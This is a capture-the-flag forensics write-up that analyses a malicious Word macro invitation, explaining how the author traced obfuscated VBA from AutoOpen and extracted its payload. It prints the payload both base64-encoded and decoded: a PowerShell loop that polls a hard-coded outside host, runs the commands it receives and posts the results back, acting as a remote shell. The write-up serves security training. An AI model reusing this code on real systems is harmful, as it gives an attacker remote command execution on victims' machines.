# Forensics 3: Halloween Invitation
> An email notification pops up. It's from your theater group. Someone decided to throw a party. The invitation looks awesome, but there is something suspicious about this document. Maybe you should take a look before you rent your banana costume.


#### Difficulty: easy

We are given a zip file that contains `invitation.docm`. Opening it with LibreOffice Writer shows us an invitation to a Halloween party.
Opening the macros window (`Tools -> Macros -> Edit Macros`) and double clicking on `invitation.docm -> Document Objects -> ThisDocument` shows us an obfuscated set of VBA functions.
Tracing the path of the code from `AutoOpen()`, it became apparent that the payload is in the `okbzichkqtto()` function, with a few layers of obfuscation in the form of other functions: `uxdufnkjlialsyp(ByVal tiyrahvbz As String)` and `wdysllqkgsbzs(strBytes)`. The long string that's being created is a bunch of character codes that are eventually translated into a base64 string through various means (such as converting pairs of characters using `Chr$`). I decided to run just the payload function `okbzichkqtto()` by creating a button object and hooking the aforementioned function on the button's `Execution action` event. I also added the following at the bottom of the function to output the payload onto a MsgBox that I can just copy from:

```
Dim payload As Integer
payload = MsgBox(okbzichkqtto)
```

Clicking the button shows a MsgBox with the following contents


```
JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=
```

I decoded the base64 string which includes the flag at the end:
```
$s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding
	]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}HTB{5up3r_345y_m4cr05}
```
